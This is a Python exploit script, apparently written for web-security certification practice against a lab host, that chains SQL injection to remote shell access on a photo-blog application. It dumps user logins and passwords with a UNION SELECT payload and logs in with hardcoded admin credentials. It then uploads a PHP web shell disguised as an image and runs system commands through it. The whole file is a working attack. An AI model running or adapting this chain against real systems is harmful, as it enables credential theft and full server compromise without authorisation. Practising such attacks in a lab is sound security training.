import requests

## Configuration
target="172.16.113.159"
url="http://" + target
path_file="/home/nyanyi/awae/preparacion/sqli_to_shell/solucion/console.php3"
url_admin= url + "/admin/index.php"
command='uname -a; id'

def sqli():
    url_sqli = url + "/cat.php"
    payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
    r=requests.get(url_sqli, params=payload, verify=False)
    print(r.text)


def login():
    payload={'user':'admin', 'password':'P4ssw0rd'}
    r=requests.post(url_admin, data=payload, verify=False)
    print(r.status_code)
    return(r.cookies['PHPSESSID'])


def file_upload(idcookies):
    payload = {'title':"hpl", 'category':'1', 'Add':'Add'}
    files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
    cookies=dict(PHPSESSID=idcookies)
    requests.post(url_admin, files=files, data=payload, cookies=cookies, verify=False)

def remote_console():
    url_path_console = url + "/admin/uploads/lovecraft"
    payload = {'cmd':command}
    r=requests.get(url_path_console, params=payload, verify=False)
    print(r.text)

if __name__=='__main__':
    sqli()
    file_upload(login())
    remote_console()
    print("One day a tortoise will learn how to fly")
